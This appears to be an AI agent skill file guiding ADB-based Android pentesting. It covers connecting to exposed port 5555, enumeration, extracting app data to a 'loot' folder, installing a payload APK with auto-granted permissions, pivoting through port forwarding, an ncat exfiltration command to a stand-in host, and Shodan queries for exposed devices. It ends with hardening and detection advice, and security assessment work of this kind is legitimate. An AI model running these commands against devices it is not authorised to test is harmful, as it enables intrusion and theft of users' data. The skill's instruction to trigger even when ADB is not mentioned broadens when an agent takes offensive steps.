---
name: adb-pentest
description: Android Debug Bridge (ADB) pentesting and exploitation. Use this skill whenever the user mentions ADB, Android debugging, port 5555, mobile device exploitation, Android security testing, wireless debugging, or any scenario involving connecting to Android devices for security assessment. This includes enumeration, privilege escalation, data extraction, payload delivery, and pivoting through ADB. Trigger even if the user doesn't explicitly say "ADB" but describes connecting to an Android device, accessing mobile services, or testing Android security.
---

# Android Debug Bridge (ADB) Pentesting

A comprehensive guide for security testing Android devices via ADB, covering connection, enumeration, exploitation, and post-exploitation techniques.

## When to Use This Skill

Use this skill when:
- You discover port 5555 open on a target (classic ADB)
- You need to connect to an Android device for security testing
- You're performing mobile application security assessments
- You need to enumerate or extract data from Android devices
- You're testing wireless debugging configurations (Android 11+)
- You need to deliver payloads or pivot through an Android device

## Quick Start

If you find ADB exposed and reachable, connect and enumerate immediately:

```bash
adb connect <ip>[:<port>]      # Default is 5555 for classic mode
adb devices -l                 # Confirm it shows as "device" (not unauthorized/offline)
adb shell                      # Get an interactive shell (uid usually shell)
whoami; id; getprop ro.debuggable ro.secure service.adb.tcp.port
adb root || true               # Works on eng/userdebug/insecure builds, many emulators/IoT
```

## Connection Methods

### Classic TCP Mode (Port 5555)

The historical default for ADB over TCP. Common on engineering builds, emulators, IoT devices, and misconfigured production devices.

```bash
adb connect <ip>:5555
adb connect <ip>               # 5555 is default
```

### Wireless Debugging (Android 11+)

Modern Android uses TLS-protected wireless debugging with device-side pairing and mDNS discovery. Ports are dynamic.

```bash
# On the device: Developer options -> Wireless debugging -> Pair device with pairing code
# On attacker host (same L2 network, mDNS allowed):
adb pair <device_ip>:<pair_port>   # Enter the 6-digit code shown on device
adb mdns services                  # Discover _adb-tls-connect._tcp / _adb._tcp services
adb connect <device_ip>:<conn_port>
```

**Service discovery notes:**
- `_adb-tls-pairing._tcp` - pairing service
- `_adb-tls-connect._tcp` - paired connect service
- `_adb._tcp` - legacy/plain ADB

If mDNS is filtered, classic USB-assisted enabling may still work on some builds: `adb tcpip 5555` then `adb connect <ip>:5555` (until reboot).

## Initial Enumeration

Once connected, validate privileges and gather device information:

```bash
id; getenforce; getprop ro.build.type ro.product.model ro.build.fingerprint
```

Key properties to check:
- `ro.debuggable` - Is the device in debug mode?
- `ro.build.type` - user, userdebug, or eng (eng/userdebug often have weaker security)
- `ro.adb.secure` - Does ADB require authentication?
- `ro.secure` - General security level
- `service.adb.tcp.port` - Current ADB TCP port

### Authentication Considerations

- If the device enforces ADB authentication (`ro.adb.secure=1`), you'll need to be pre-authorized (USB RSA auth) or use Android 11+ Wireless debugging pairing (requires a one-time code displayed on the device).
- Some vendor images, engineering/userdebug builds, emulators, TVs, STBs, and development kits expose adbd without auth or with adbd running as root. In those cases, you'll typically land directly in a shell or root shell.

## Data Enumeration and Extraction

### List Third-Party Applications

```bash
pm list packages -3              # List all third-party packages
pm path <pkg>                    # Get APK path for a specific package
```

### Extract Application Data

**Without root** (for debuggable apps only):
```bash
# Extract app data using run-as
run-as <pkg> sh -c 'cd /data/data/<pkg> && tar cf - .' | tar xf - -C ./loot/<pkg>
```

**With root**:
```bash
# Copy app data to accessible location
adb shell "cp -a /data/data/<pkg> /sdcard/<pkg>"
adb pull "/sdcard/<pkg>"
```

### Sensitive System Artifacts (Root Required)

- `/data/system/users/0/accounts.db` - AccountManager data
- `/data/misc/wifi/` - Network configurations and keys (older versions)
- `/data/data/<pkg>/databases/` - App-specific SQLite databases
- `/data/data/<pkg>/shared_prefs/` - Application preferences

## Payload Delivery and Execution

### Install and Auto-Grant Permissions

```bash
adb install -r -g payload.apk         # -g grants all runtime perms declared in manifest
adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1  # Launch app
```

### Direct Activity/Service/Broadcast Execution

```bash
adb shell am start -n <pkg>/<activity>           # Start activity
adb shell am startservice -n <pkg>/<service>     # Start service
adb shell am broadcast -a <action>               # Send broadcast
```

## Port Forwarding and Pivoting

ADB can forward local ports to device ports and vice versa, even without root. This is useful to access services bound locally on the device or to expose attacker services to the device.

### Forward Host to Device

Access a device-local service from your host:

```bash
adb forward tcp:2222 tcp:22       # If device runs SSH (e.g., Termux/Dropbear)
adb forward tcp:8081 tcp:8080     # Expose app's local debug server
```

### Reverse Device to Host

Let the device reach a service on your host:

```bash
adb reverse tcp:1080 tcp:1080     # Device apps can now reach host:1080 as 127.0.0.1:1080
```

### File Exfiltration Over Sockets

Exfiltrate data without writing to sdcard:

```bash
# On host: listen for incoming data
ncat -lvp 9000 > dump.tar

# On device: send directory as tar (root or run-as as applicable)
adb shell "tar cf - /data/data/<pkg>" | ncat <HOST_IP> 9000
```

## Hardening and Detection

### Defensive Recommendations

Defenders should assume any reachable adbd (TCP) is critical risk:

- Disable ADB and Wireless debugging when not needed
- Revoke USB debugging authorizations in Developer options
- Ensure network policy blocks inbound TCP/5555 and mDNS-based ADB discovery on untrusted segments
- Monitor for mDNS records `_adb._tcp`, `_adb-tls-connect._tcp`, `_adb-tls-pairing._tcp` on corporate networks
- Alert on unexpected 5555 listeners

### Disable ADB on Devices Under Your Control

```bash
settings put global adb_enabled 0
setprop service.adb.tcp.port -1   # disable TCP listening (or use: adb usb)
stop adbd; start adbd             # restart daemon
```

### Inventory for Insecure Builds

```bash
getprop ro.debuggable
getprop ro.build.type
getprop ro.adb.secure
```

## Shodan Queries

For reconnaissance:

```
android debug bridge
port:5555 product:"Android Debug Bridge"
```

## References

- [Android Developers – Android Debug Bridge (adb)](https://developer.android.com/studio/command-line/adb)
- [AOSP – ADB over Wi‑Fi, pairing and mDNS service names](https://android.googlesource.com/platform/packages/modules/adb/+/refs/tags/android-vts-15.0_r2/docs/dev/adb_wifi.md)
